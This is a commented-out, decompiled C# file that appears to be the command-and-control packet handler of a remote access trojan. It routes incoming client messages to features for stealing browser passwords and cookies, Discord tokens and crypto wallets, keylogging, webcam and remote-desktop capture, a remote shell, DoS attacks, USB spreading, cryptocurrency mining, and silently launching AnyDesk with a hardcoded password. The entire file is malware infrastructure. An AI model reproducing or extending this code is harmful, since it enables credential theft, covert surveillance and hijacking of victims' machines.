//using System;
//using System.Diagnostics;
//using System.Drawing;
//using System.Threading;
//using System.Windows.Forms;
//using Server.Connection;
//using Server.MessagePack;

//namespace Server.Handle_Packet
//{
//	// Token: 0x02000077 RID: 119
//	public class Packet
//	{
//		// Token: 0x0600030E RID: 782 RVA: 0x00021868 File Offset: 0x0001FA68
//		public void Read(object o)
//		{
//			try
//			{
//				MsgPack unpack_msgpack = new MsgPack();
//				unpack_msgpack.DecodeFromBytes(this.data);
//				WaitCallback <>9__1;
//				WaitCallback <>9__2;
//				Program.form1.Invoke(new MethodInvoker(delegate()
//				{
//					string asString = unpack_msgpack.ForcePathObject("Packet").AsString;
//					uint num = <PrivateImplementationDetails>.ComputeStringHash(asString);
//					if (num <= 2061178551U)
//					{
//						if (num <= 1193797133U)
//						{
//							if (num <= 78554036U)
//							{
//								if (num <= 40220012U)
//								{
//									if (num != 29539515U)
//									{
//										if (num != 40220012U)
//										{
//											return;
//										}
//										if (!(asString == "cbget"))
//										{
//											return;
//										}
//										Clipboard.SetText(unpack_msgpack.ForcePathObject("Message").AsString);
//										return;
//									}
//									else
//									{
//										if (!(asString == "recoveryPassword"))
//										{
//											return;
//										}
//										new HandleRecovery(this.client, unpack_msgpack);
//										return;
//									}
//								}
//								else if (num != 60411378U)
//								{
//									if (num != 78554036U)
//									{
//										return;
//									}
//									if (!(asString == "dosAdd"))
//									{
//										return;
//									}
//									new HandleDos().Add(this.client, unpack_msgpack);
//									return;
//								}
//								else
//								{
//									if (!(asString == "chat-"))
//									{
//										return;
//									}
//									new HandleChat().GetClient(unpack_msgpack, this.client);
//									return;
//								}
//							}
//							else if (num <= 427698926U)
//							{
//								if (num != 300022785U)
//								{
//									if (num != 427698926U)
//									{
//										return;
//									}
//									if (!(asString == "Fox"))
//									{
//										return;
//									}
//									new FoxCookies(this.client, unpack_msgpack);
//									return;
//								}
//								else
//								{
//									if (!(asString == "shell"))
//									{
//										return;
//									}
//									new HandleShell(unpack_msgpack, this.client);
//									return;
//								}
//							}
//							else if (num != 859067476U)
//							{
//								if (num != 1021281107U)
//								{
//									if (num != 1193797133U)
//									{
//										return;
//									}
//									if (!(asString == "wallets"))
//									{
//										return;
//									}
//									new Wallets(this.client, unpack_msgpack);
//									return;
//								}
//								else
//								{
//									if (!(asString == "Chrome"))
//									{
//										return;
//									}
//									new ChromiumCookies(this.client, unpack_msgpack);
//								}
//							}
//							else
//							{
//								if (!(asString == "socketDownload"))
//								{
//									return;
//								}
//								new HandleFileManager().SocketDownload(this.client, unpack_msgpack);
//								return;
//							}
//						}
//						else if (num <= 1559762898U)
//						{
//							if (num <= 1370058150U)
//							{
//								if (num != 1231575816U)
//								{
//									if (num != 1370058150U)
//									{
//										return;
//									}
//									if (!(asString == "Logs"))
//									{
//										return;
//									}
//									new HandleLogs().Addmsg("Client " + this.client.Ip + " " + unpack_msgpack.ForcePathObject("Message").AsString, Color.Black);
//									return;
//								}
//								else
//								{
//									if (!(asString == "webcam"))
//									{
//										return;
//									}
//									new HandleWebcam(unpack_msgpack, this.client);
//									return;
//								}
//							}
//							else if (num != 1452393313U)
//							{
//								if (num != 1559762898U)
//								{
//									return;
//								}
//								if (!(asString == "Received"))
//								{
//									return;
//								}
//								new HandleListView().Received(this.client);
//								return;
//							}
//							else
//							{
//								if (!(asString == "usb"))
//								{
//									return;
//								}
//								new HandleLogs().Addmsg(string.Concat(new string[]
//								{
//									"Client ",
//									this.client.Ip,
//									" found ",
//									unpack_msgpack.ForcePathObject("Count").AsString,
//									" USB drivers and spreaded them successfully"
//								}), Color.Purple);
//								return;
//							}
//						}
//						else if (num <= 1911311572U)
//						{
//							if (num != 1800677779U)
//							{
//								if (num != 1911311572U)
//								{
//									return;
//								}
//								if (!(asString == "sendPlugin"))
//								{
//									return;
//								}
//								new HandleLogs().Addmsg("Sending the plugin to client " + this.client.Ip + " for the first time please wait..", Color.Blue);
//								WaitCallback callBack;
//								if ((callBack = <>9__2) == null)
//								{
//									callBack = (<>9__2 = delegate(object <p0>)
//									{
//										this.client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
//									});
//								}
//								ThreadPool.QueueUserWorkItem(callBack);
//								return;
//							}
//							else
//							{
//								if (!(asString == "reportWindow"))
//								{
//									return;
//								}
//								new HandleReportWindow(this.client, unpack_msgpack.ForcePathObject("Report").AsString);
//								return;
//							}
//						}
//						else if (num != 1933479032U)
//						{
//							if (num != 1970227368U)
//							{
//								if (num != 2061178551U)
//								{
//									return;
//								}
//								if (!(asString == "pong"))
//								{
//									return;
//								}
//								new HandlePing().Pong(this.client, unpack_msgpack);
//								return;
//							}
//							else
//							{
//								if (!(asString == "DicordTokens"))
//								{
//									return;
//								}
//								new Discord(this.client, unpack_msgpack);
//								return;
//							}
//						}
//						else
//						{
//							if (!(asString == "fileSearcher"))
//							{
//								return;
//							}
//							new HandlerFileSearcher().SaveZipFile(this.client, unpack_msgpack);
//							return;
//						}
//					}
//					else if (num <= 3578771430U)
//					{
//						if (num <= 2319240225U)
//						{
//							if (num <= 2155392417U)
//							{
//								if (num != 2142761129U)
//								{
//									if (num != 2155392417U)
//									{
//										return;
//									}
//									if (!(asString == "processManager"))
//									{
//										return;
//									}
//									new HandleProcessManager().GetProcess(this.client, unpack_msgpack);
//									return;
//								}
//								else
//								{
//									if (!(asString == "Ping"))
//									{
//										return;
//									}
//									new HandlePing().Ping(this.client, unpack_msgpack);
//									return;
//								}
//							}
//							else if (num != 2207001692U)
//							{
//								if (num != 2319240225U)
//								{
//									return;
//								}
//								if (!(asString == "remoteDesktop"))
//								{
//									return;
//								}
//								new HandleRemoteDesktop().Capture(this.client, unpack_msgpack);
//								return;
//							}
//							else
//							{
//								if (!(asString == "thumbnails"))
//								{
//									return;
//								}
//								this.client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
//								new HandleThumbnails(this.client, unpack_msgpack);
//								return;
//							}
//						}
//						else if (num <= 3011360282U)
//						{
//							if (num != 2722888107U)
//							{
//								if (num != 3011360282U)
//								{
//									return;
//								}
//								if (!(asString == "reportWindow-"))
//								{
//									return;
//								}
//								if (!Settings.ReportWindow)
//								{
//									MsgPack msgPack = new MsgPack();
//									msgPack.ForcePathObject("Packet").AsString = "reportWindow";
//									msgPack.ForcePathObject("Option").AsString = "stop";
//									ThreadPool.QueueUserWorkItem(new WaitCallback(this.client.Send), msgPack.Encode2Bytes());
//									return;
//								}
//								object obj = Settings.LockReportWindowClients;
//								lock (obj)
//								{
//									Settings.ReportWindowClients.Add(this.client);
//									return;
//								}
//							}
//							if (!(asString == "chat"))
//							{
//								return;
//							}
//							new HandleChat().Read(unpack_msgpack, this.client);
//							return;
//						}
//						else if (num != 3032815688U)
//						{
//							if (num != 3233163102U)
//							{
//								if (num != 3578771430U)
//								{
//									return;
//								}
//								if (!(asString == "GetXmr"))
//								{
//									return;
//								}
//								new HandleMiner().SendMiner(this.client);
//								return;
//							}
//							else
//							{
//								if (!(asString == "ClientInfo"))
//								{
//									return;
//								}
//								WaitCallback callBack2;
//								if ((callBack2 = <>9__1) == null)
//								{
//									callBack2 = (<>9__1 = delegate(object <p0>)
//									{
//										new HandleListView().AddToListview(this.client, unpack_msgpack);
//									});
//								}
//								ThreadPool.QueueUserWorkItem(callBack2);
//								return;
//							}
//						}
//						else
//						{
//							if (!(asString == "keyLogger"))
//							{
//								return;
//							}
//							new HandleKeylogger(this.client, unpack_msgpack);
//							return;
//						}
//					}
//					else if (num <= 3704801822U)
//					{
//						if (num <= 3648591194U)
//						{
//							if (num != 3644100786U)
//							{
//								if (num != 3648591194U)
//								{
//									return;
//								}
//								if (!(asString == "Avast"))
//								{
//									return;
//								}
//								new HandleLogs().Addmsg("Client " + this.client.Ip + " " + unpack_msgpack.ForcePathObject("MSG").AsString, Color.Purple);
//								return;
//							}
//							else
//							{
//								if (!(asString == "fileManager"))
//								{
//									return;
//								}
//								new HandleFileManager().FileManager(this.client, unpack_msgpack);
//								return;
//							}
//						}
//						else if (num != 3694678581U)
//						{
//							if (num != 3704801822U)
//							{
//								return;
//							}
//							if (!(asString == "klget"))
//							{
//								return;
//							}
//							new KeyLogger(this.client, unpack_msgpack);
//							return;
//						}
//						else
//						{
//							if (!(asString == "BotKiller"))
//							{
//								return;
//							}
//							new HandleLogs().Addmsg(string.Concat(new string[]
//							{
//								"Client ",
//								this.client.Ip,
//								" found ",
//								unpack_msgpack.ForcePathObject("Count").AsString,
//								" malwares and killed them successfully"
//							}), Color.Orange);
//							return;
//						}
//					}
//					else if (num <= 3948515689U)
//					{
//						if (num != 3775059164U)
//						{
//							if (num != 3948515689U)
//							{
//								return;
//							}
//							if (!(asString == "AllInOne"))
//							{
//								return;
//							}
//							new AllInOne(this.client, unpack_msgpack);
//							return;
//						}
//						else
//						{
//							if (!(asString == "loge"))
//							{
//								return;
//							}
//							string asString2 = unpack_msgpack.ForcePathObject("ID").AsString;
//							new HandleLogs().Addmsg("Client " + this.client.Ip + " " + asString2, Color.Purple);
//							return;
//						}
//					}
//					else if (num != 4053298894U)
//					{
//						if (num != 4086144241U)
//						{
//							if (num != 4204486352U)
//							{
//								return;
//							}
//							if (!(asString == "anydesk"))
//							{
//								return;
//							}
//							new HandleLogs().Addmsg("Client " + this.client.Ip + " Starting AnyDesk..", Color.Purple);
//							string asString3 = unpack_msgpack.ForcePathObject("ID").AsString;
//							try
//							{
//								Process.Start(new ProcessStartInfo
//								{
//									FileName = "cmd.exe",
//									WindowStyle = ProcessWindowStyle.Hidden,
//									Arguments = "/c echo hb..123456 | Plugins\\Anydesk.exe " + asString3 + " --with-password"
//								});
//								new HandleLogs().Addmsg("Client " + this.client.Ip + " Started!", Color.Green);
//								return;
//							}
//							catch (Exception ex)
//							{
//								new HandleLogs().Addmsg("Error! : " + ex.Message, Color.Red);
//								return;
//							}
//						}
//						if (!(asString == "Error"))
//						{
//							return;
//						}
//						new HandleLogs().Addmsg("Client " + this.client.Ip + " error: " + unpack_msgpack.ForcePathObject("Error").AsString, Color.Red);
//						object obj = Settings.LockListviewClients;
//						lock (obj)
//						{
//							this.client.LV.ForeColor = Color.Empty;
//						}
//					}
//					else
//					{
//						if (!(asString == "WebBrowserPass"))
//						{
//							return;
//						}
//						new WebBrowserPass(this.client, unpack_msgpack);
//						return;
//					}
//				}));
//			}
//			catch
//			{
//			}
//		}

//		// Token: 0x04000213 RID: 531
//		public Clients client;

//		// Token: 0x04000214 RID: 532
//		public byte[] data;
//	}
//}
